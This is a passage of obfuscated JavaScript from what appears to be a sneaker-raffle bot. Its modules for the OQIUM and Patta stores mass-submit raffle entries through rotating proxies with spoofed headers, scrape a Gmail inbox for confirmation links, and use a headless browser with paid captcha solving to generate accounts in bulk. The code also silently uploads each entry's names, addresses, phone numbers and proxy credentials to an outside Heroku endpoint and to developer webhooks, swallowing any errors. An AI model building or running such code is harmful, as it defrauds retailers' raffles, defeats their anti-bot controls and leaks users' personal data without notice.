                                var _0x5c539a, _0x468a1e = {}, _0x1335d9 = [], _0x1e4394 = {}, _0x2a3be3 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x647662 = Math['round'](Math['random']() * (_0x2a3be3['length'] - 0x1));
                                !_0x355a69 && (_0x355a69 = {});
                                if (_0x2d4035 != 'ver') {
                                    _0x244762(_0x284215['name'] + '\x20Task\x20' + (_0x3dee62 + 0x1) + '\x20/\x20' + _0x355a69['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7), _0x1335d9 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x358285
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x355a69[_0x3dee62]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x51d52a['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x3b2d4c
                                            }
                                        ]
                                    }], _0x1e4394 = { 'embeds': _0x1335d9 }, _0x468a1e = _0x284215['data'], _0x468a1e['data']['attributes']['email'] = '' + _0x355a69[_0x3dee62]['Email'];
                                    if (_0x355a69[_0x3dee62]['Size'] == 'RANDOM') {
                                    }
                                    _0x468a1e['data']['attributes']['properties']['$first_name'] = '' + _0x355a69[_0x3dee62]['FirstName'], _0x468a1e['data']['attributes']['properties']['$last_name'] = '' + _0x355a69[_0x3dee62]['LastName'], _0x468a1e['data']['attributes']['properties']['$address1'] = _0x355a69[_0x3dee62]['Address1'] + '\x20' + _0x355a69[_0x3dee62]['Address2'] + '\x20' + _0x355a69[_0x3dee62]['HouseNumber'], _0x468a1e['data']['attributes']['properties']['$zip'] = '' + _0x355a69[_0x3dee62]['Zip'], _0x468a1e['data']['attributes']['properties']['$city'] = '' + _0x355a69[_0x3dee62]['City'], _0x468a1e['data']['attributes']['properties']['$country'] = '' + _0x355a69[_0x3dee62]['Country'], _0x355a69[_0x3dee62]['Size'] == 'RANDOM' ? _0x468a1e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2a3be3[_0x647662] : _0x468a1e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x355a69[_0x3dee62]['Size'], _0x468a1e['data']['attributes']['properties']['$phone_number'] = '' + _0x355a69[_0x3dee62]['Phone'], _0x468a1e['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x355a69[_0x3dee62]['Follower'];
                                }
                                if (_0x51d52a['useRandomProxy'] = ![])
                                    var _0x18196f = _0x57353b[_0x3dee62]['split'](':');
                                else
                                    var _0x385773 = Math['round'](Math['random']() * (_0x57353b['length'] - 0x1)), _0x18196f = _0x57353b[_0x385773]['split'](':');
                                var _0x34143b = {
                                    'jar': _0x103baf,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x284215['url'],
                                    'headers': _0x284215['headers'],
                                    'body': JSON['stringify'](_0x468a1e),
                                    'proxy': 'http://' + _0x18196f[0x2] + ':' + _0x18196f[0x3] + '@' + _0x18196f[0x0] + ':' + _0x18196f[0x1]
                                };
                                return _0x2d4035 != 'ver' && (_0x34143b['url'] = _0x284215['url'], _0x34143b['headers'] = _0x284215['headers']), _0x2d4035 == 'ver' && (_0x34143b['method'] = 'GET'), new Promise(function (_0x6c71d0, _0x21317c) {
                                    callback = async (_0x446288, _0x20c425, _0x16cce6) => {
                                        if (!_0x446288 && _0x20c425['statusCode'] == 0xca || !_0x446288 && _0x20c425['statusCode'] == 0xc8) {
                                            if (_0x2d4035 != 'ver') {
                                                var _0x2fac89 = await _0x2520f4(_0x355a69[_0x3dee62], _0x284215, 'dev', ![]), _0x3a2d65 = await _0x2520f4(_0x355a69[_0x3dee62], _0x284215, 'pub', ![]);
                                                const _0x437d14 = {
                                                    'succesDEVMSG': { 'embeds': [_0x2fac89] },
                                                    'succesPUBMSG': { 'embeds': [_0x3a2d65] }
                                                };
                                                let _0x1b67d0 = _0x355a69[_0x3dee62];
                                                try {
                                                    prxdata = {
                                                        'username': _0x358285['replace']('#', ''),
                                                        'module': _0x284215['name'],
                                                        'entrydata': JSON['stringify'](_0x1b67d0),
                                                        'proxy': '' + _0x57353b[_0x3dee62]
                                                    };
                                                    var _0x154315 = JSON['stringify'](prxdata);
                                                    let _0x2cc185 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x154315, _0x2cc185);
                                                } catch (_0x12266c) {
                                                }
                                                if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                                    try {
                                                        await _0x3c7bbe(_0x51d52a['webhook'], _0x437d14['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x437d14['succesDEVMSG']), await _0x116d4a(0xc8);
                                                try {
                                                    await _0x3c7bbe(_0x55a106, _0x437d14['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x523ce4(_0x355a69[_0x3dee62], _0x284215);
                                            }
                                            _0x49d35c--, _0x6c71d0(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x284215['name'] + ']\x20Task\x20' + (_0x3dee62 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2d4035 != 'ver') {
                                                var _0x4f4b37 = '' + _0x446288, _0x56a9b5 = await _0x2520f4(_0x355a69[_0x3dee62], _0x284215, 'dev', !![], _0x4f4b37), _0x147353 = {};
                                                _0x147353['errorDEV'] = { 'embeds': [_0x56a9b5] }, _0x5925c7(_0x355a69[_0x3dee62], _0x284215), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x147353['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x147353['errorDEV']);
                                            }
                                            _0x49d35c--, _0x21317c(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x284215['name'] + ']\x20Task\x20' + (_0x3dee62 + 0x1) + ':\x20' + _0x446288)));
                                        }
                                    };
                                    try {
                                        _0x2d4035 != 'ver' && console['log'](_0x3982db() + '\x20[' + _0x284215['name'] + ']\x20Task\x20' + (_0x3dee62 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x468a1e['data']['attributes']['email']), _0x225fcc(_0x34143b, callback);
                                    } catch (_0x105d26) {
                                        console['log'](_0x3982db() + '\x20Task\x20' + (_0x3dee62 + 0x1) + ':\x20' + _0x105d26);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x21e209(_0x50afab, 'nor', _0x37ec4e, _0x274499, _0x20a986), console['log'](_0x3982db() + '\x20[' + _0x37ec4e['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                            } catch (_0x5ea170) {
                            }
                        }
                        _0x11e5ee(_0x10010f, _0x4ca455, _0x71d199, _0x121e1a), await _0x116d4a(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x40f21d, _0x1b6d57, _0xa84cad) {
                    var _0x1b6d57 = [], _0x2ff5f4 = ![];
                    async function _0x15ae07() {
                        var _0x51f720 = new _0x3e4e8d({
                            'user': _0x51d52a['masterMail'],
                            'password': _0x51d52a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x34c8cc(_0x2aa8ce) {
                            _0x51f720['openBox']('INBOX', ![], _0x2aa8ce);
                        }
                        _0x51f720['once']('ready', function () {
                            _0x34c8cc(function (_0x5c9b62, _0x437576) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5c9b62)
                                    throw _0x5c9b62;
                                _0x51f720['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x244b55, _0x1ea371) {
                                    if (!_0x1ea371 || !_0x1ea371['length'])
                                        console['log'](_0x3982db() + '\x20[' + _0x40f21d['name'] + ']\x20No\x20mails\x20found'), _0x51f720['end']();
                                    else {
                                        var _0x506359 = _0x51f720['seq']['fetch'](_0x1ea371, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x506359['on']('message', function (_0x1a1173, _0x19117e) {
                                            var _0x47237e = '(#' + _0x19117e + ')\x20';
                                            _0x1a1173['on']('body', function (_0x3811ec, _0x8fab52) {
                                                _0x300bc8(_0x3811ec, (_0x4c19e1, _0x34b9c2) => {
                                                    var _0x33f5a0 = _0x34b9c2['text']['split']('(')[0x1], _0x368260 = _0x33f5a0['split'](')')[0x0];
                                                    _0x1b6d57['push'](_0x368260);
                                                });
                                            }), _0x1a1173['once']('end', function () {
                                            });
                                        }), _0x506359['once']('error', function (_0x251f30) {
                                            console['log']('Fetch\x20error:\x20' + _0x251f30), _0x2ff5f4 = !![];
                                        }), _0x506359['once']('end', function () {
                                            _0x51f720['end'](), _0x2ff5f4 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x51f720['once']('error', function (_0x64f2a0) {
                            console['log'](_0x64f2a0), _0x2ff5f4 = !![];
                        }), _0x51f720['once']('end', async function () {
                            _0x2ff5f4 = !![];
                        }), _0x51f720['connect']();
                    }
                    async function _0x8148e8(_0x1937dd, _0x343e01, _0x593783) {
                        for (var _0x310f54 = 0x0; _0x310f54 < _0x343e01['length']; _0x310f54++) {
                            async function _0x47d91a(_0x5bfce7, _0x154175, _0xf7b69a, _0x2ab1d3, _0x529678) {
                                var _0x3b89e2, _0x1fa26f = {}, _0x2712c2 = [], _0x42feff = {}, _0x3ce127 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x30e062 = Math['round'](Math['random']() * (_0x3ce127['length'] - 0x1));
                                _0x2ab1d3[_0x5bfce7]['Size'] == 'RANDOM' && (_0x2ab1d3[_0x5bfce7]['Size'] = _0x3ce127[_0x30e062]);
                                !_0x2ab1d3 && (_0x2ab1d3 = {});
                                if (_0x51d52a['useRandomProxy'] = ![])
                                    var _0x74c6a5 = _0x529678[_0x5bfce7]['split'](':');
                                else
                                    var _0x38fa8b = Math['round'](Math['random']() * (_0x529678['length'] - 0x1)), _0x74c6a5 = _0x529678[_0x38fa8b]['split'](':');
                                var _0x2ff492 = {
                                    'jar': _0x103baf,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xf7b69a['url'],
                                    'headers': _0xf7b69a['headers'],
                                    'body': JSON['stringify'](_0x1fa26f),
                                    'proxy': 'http://' + _0x74c6a5[0x2] + ':' + _0x74c6a5[0x3] + '@' + _0x74c6a5[0x0] + ':' + _0x74c6a5[0x1]
                                };
                                return _0x154175 != 'ver' && (_0x2ff492['url'] = _0xf7b69a['url'], _0x2ff492['headers'] = _0xf7b69a['headers']), _0x154175 == 'ver' && (_0x2ff492['method'] = 'GET', _0x2ff492['url'] = _0x2ab1d3[_0x5bfce7]), new Promise(function (_0x2f2f24, _0x36062c) {
                                    callback = async (_0x59e7d0, _0x5f7621, _0x542d1c) => {
                                        if (!_0x59e7d0 && _0x5f7621['statusCode'] == 0xca || !_0x59e7d0 && _0x5f7621['statusCode'] == 0xc8) {
                                            if (_0x154175 != 'ver') {
                                                var _0xfa97d1 = await _0x2520f4(_0x2ab1d3[_0x5bfce7], _0xf7b69a, 'dev', ![]), _0x33c5f1 = await _0x2520f4(_0x2ab1d3[_0x5bfce7], _0xf7b69a, 'pub', ![]);
                                                const _0x23612c = {
                                                    'succesDEVMSG': { 'embeds': [_0xfa97d1] },
                                                    'succesPUBMSG': { 'embeds': [_0x33c5f1] }
                                                };
                                                if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                                    try {
                                                        await _0x3c7bbe(_0x51d52a['webhook'], _0x23612c['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x23612c['succesDEVMSG']), await _0x116d4a(0xc8);
                                                try {
                                                    await _0x3c7bbe(_0x55a106, _0x23612c['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x523ce4(_0x2ab1d3[_0x5bfce7], _0xf7b69a);
                                            }
                                            _0x2f2f24(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0xf7b69a['name'] + ']\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x154175 != 'ver') {
                                                var _0xb970b = '' + _0x59e7d0, _0x140d77 = await _0x2520f4(_0x2ab1d3[_0x5bfce7], _0xf7b69a, 'dev', !![], _0xb970b), _0x19d6d4 = {};
                                                _0x19d6d4['errorDEV'] = { 'embeds': [_0x140d77] }, _0x5925c7(_0x2ab1d3[_0x5bfce7], _0xf7b69a), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x19d6d4['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x19d6d4['errorDEV']);
                                            }
                                            _0x36062c(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xf7b69a['name'] + ']\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20' + _0x59e7d0)));
                                        }
                                    };
                                    try {
                                        _0x154175 != 'ver' ? console['log'](_0x3982db() + '\x20[' + _0xf7b69a['name'] + ']\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1fa26f['data']['attributes']['email']) : console['log'](_0x3982db() + '\x20[' + _0xf7b69a['name'] + ']\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20Fetching\x20Response'), _0x225fcc(_0x2ff492, callback);
                                    } catch (_0x222027) {
                                        console['log'](_0x3982db() + '\x20Task\x20' + (_0x5bfce7 + 0x1) + ':\x20' + _0x222027);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x47d91a(_0x310f54, 'ver', _0x1937dd, _0x343e01, _0x593783), console['log'](_0x3982db() + '\x20[' + _0x1937dd['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                            } catch (_0x342dc2) {
                            }
                        }
                    }
                    try {
                        _0x15ae07();
                        while (!_0x2ff5f4) {
                            await _0x116d4a(0xfa0);
                        }
                        console['log']('Found\x20' + _0x1b6d57['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x8148e8(_0x40f21d, _0x1b6d57, _0xa84cad);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x28ae45, _0x506e5f, _0x558f8b) {
                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51d52a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x124d60 = 0x0; _0x124d60 < _0x506e5f['length']; _0x124d60++) {
                        var _0x549cf0 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x358285
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x51d52a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3b2d4c
                                }
                            ]
                        }];
                        const _0x3a31dc = { 'embeds': _0x549cf0 };
                        _0x244762(_0x28ae45['name'] + '\x20Task\x20' + (_0x124d60 + 0x1) + '\x20/\x20' + _0x506e5f['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                        try {
                            await _0x2c2316(_0x506e5f, _0x124d60);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x423ae1 = await _0x2520f4(_0x506e5f[_0x124d60], _0x28ae45, 'acc', ![]);
                        const _0x962508 = { 'succesDEVMSG': { 'embeds': [_0x423ae1] } };
                        if (_0x506e5f[_0x124d60]['Email'] == '' || _0x506e5f[_0x124d60]['FirstName'] == '' || _0x506e5f[_0x124d60]['LastName'] == '') {
                            console['log'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x116d4a(0x7d0);
                            continue;
                        }
                        (_0x506e5f[_0x124d60]['Password'] == '' || _0x506e5f[_0x124d60] == undefined) && _0x506e5f[_0x124d60]['Password'] == 'JRaffles23!';
                        if (_0x51d52a['useRandomProxy'] = ![])
                            var _0x224edf = _0x558f8b[_0x124d60]['split'](':');
                        else
                            var _0x532a65 = Math['round'](Math['random']() * (_0x558f8b['length'] - 0x1)), _0x224edf = _0x558f8b[_0x532a65]['split'](':');
                        var _0x589e7d;
                        try {
                            _0x589e7d = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x224edf[0x0] + ':' + _0x224edf[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x589e7d = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x224edf[0x0] + ':' + _0x224edf[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x462bae = await _0x589e7d['newPage']();
                            await _0x462bae['authenticate']({
                                'username': '' + _0x224edf[0x2],
                                'password': '' + _0x224edf[0x3]
                            }), console['log'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x462bae['setRequestInterception'](!![]), _0x462bae['on']('request', _0x53c203 => {
                                _0x53c203['resourceType']() === 'image' || _0x53c203['resourceType']() === 'font' || _0x53c203['resourceType']() === 'media' ? _0x53c203['abort']() : _0x53c203['continue']();
                            }), await _0x462bae['goto']('https://patta.nl/account/register'), await _0x116d4a(0xbb8), await _0x462bae['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Filling\x20information'), await _0x462bae['type']('#RegisterForm-FirstName', '' + _0x506e5f[_0x124d60]['FirstName']), await _0x116d4a(0x226), await _0x462bae['type']('#RegisterForm-LastName', '' + _0x506e5f[_0x124d60]['LastName']), await _0x116d4a(0x226), await _0x462bae['type']('#RegisterForm-email', '' + _0x506e5f[_0x124d60]['Email']), await _0x116d4a(0x226), await _0x462bae['type']('#RegisterForm-password', '' + _0x506e5f[_0x124d60]['Password']), await _0x116d4a(0x226), console['log'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Submitting..'), await _0x462bae['$eval']('#RegisterForm', _0x5734a5 => _0x5734a5['submit']()), await _0x116d4a(0x1f40);
                            try {
                                await _0x462bae['waitForSelector']('.home-page-grid__collection'), await _0x116d4a(0x1f4), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Account\x20' + _0x506e5f[_0x124d60]['Email'] + '\x20Generated!')), _0x65e0bc['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x506e5f[_0x124d60]['Email'] + ',' + _0x506e5f[_0x124d60]['Password']), console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Account\x20' + _0x506e5f[_0x124d60]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x962508['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3c7bbe(_0x431ce7, _0x962508['succesDEVMSG']);
                            } catch (_0x55e612) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x55e612));
                            }
                        } catch (_0xbf7bcd) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20' + _0xbf7bcd));
                        } finally {
                            _0x589e7d && _0x589e7d['close'](), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x2132aa, _0x302258, _0x37c6c1) {
                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51d52a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x16ddf4 = 0x0; _0x16ddf4 < _0x302258['length']; _0x16ddf4++) {
                        var _0x4d7845;
                        if (_0x2d5d79 != 'yes')
                            var _0x2d5d79 = '', _0x329451 = 0x0;
                        _0x244762(_0x2132aa['name'] + '\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20/\x20' + _0x302258['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                        try {
                            await _0x2c2316(_0x302258, _0x16ddf4);
                        } catch {
                            _0x2d5d79 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x302258[_0x16ddf4]['Email'] == '' || _0x302258[_0x16ddf4]['Password'] == '' || _0x302258[_0x16ddf4]['FirstName'] == '' || _0x302258[_0x16ddf4]['LastName'] == '') {
                            console['log'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x51d52a['useRandomProxy'] = ![])
                            var _0x3e032f = _0x37c6c1[_0x16ddf4]['split'](':');
                        else
                            var _0x191c5e = Math['round'](Math['random']() * (_0x37c6c1['length'] - 0x1)), _0x3e032f = _0x37c6c1[_0x191c5e]['split'](':');
                        var _0x21cda1;
                        try {
                            _0x21cda1 = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3e032f[0x0] + ':' + _0x3e032f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x21cda1 = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3e032f[0x0] + ':' + _0x3e032f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x302fb3 = await _0x21cda1['newPage']();
                            await _0x302fb3['authenticate']({
                                'username': '' + _0x3e032f[0x2],
                                'password': '' + _0x3e032f[0x3]
                            }), console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x302fb3['setRequestInterception'](!![]), _0x302fb3['on']('request', _0x51c4f => {
                                _0x51c4f['resourceType']() === 'image' || _0x51c4f['resourceType']() === 'font' || _0x51c4f['resourceType']() === 'media' ? _0x51c4f['abort']() : _0x51c4f['continue']();
                            }), await _0x302fb3['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x302fb3['waitForSelector']('#CustomerEmail'), console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x302fb3['type']('#CustomerEmail', '' + _0x302258[_0x16ddf4]['Email']), await _0x116d4a(0x12c), await _0x302fb3['type']('#CustomerPassword', '' + _0x302258[_0x16ddf4]['Password']), await _0x116d4a(0x226), await _0x302fb3['$eval']('#customer_login', _0x57353c => _0x57353c['submit']());
                            try {
                                await _0x302fb3['waitForSelector']('#orders'), await _0x116d4a(0x4b0);
                            } catch {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x302fb3['goto']('' + _0x302258[_0x16ddf4]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x116d4a(0xbb8), console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x302fb3['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x302fb3['type']('#email', '' + _0x302258[_0x16ddf4]['Email']), await _0x116d4a(0x384), await _0x302fb3['type']('#first_name', '' + _0x302258[_0x16ddf4]['FirstName']), await _0x116d4a(0x514), await _0x302fb3['type']('#last_name', '' + _0x302258[_0x16ddf4]['LastName']), await _0x116d4a(0x514), await _0x302fb3['type']('#street_address', _0x302258[_0x16ddf4]['Address1'] + '\x20' + _0x302258[_0x16ddf4]['HouseNumber'] + '\x20' + _0x302258[_0x16ddf4]['Address2']), await _0x116d4a(0x2bc);
                            _0x302258[_0x16ddf4]['Postcode'] == undefined && (_0x302258[_0x16ddf4]['Postcode'] = _0x302258[_0x16ddf4]['Zip']);
                            await _0x302fb3['type']('#zip_code', '' + _0x302258[_0x16ddf4]['Postcode']), await _0x116d4a(0x320), await _0x302fb3['type']('#city', '' + _0x302258[_0x16ddf4]['City']), await _0x116d4a(0x320), await _0x302fb3['type']('#bday', '01/01/1994'), await _0x116d4a(0x320), await _0x302fb3['type']('#instagram', '' + _0x302258[_0x16ddf4]['Follower']), await _0x116d4a(0x352);
                            if (_0x302258[_0x16ddf4]['Size'] == 'RANDOM') {
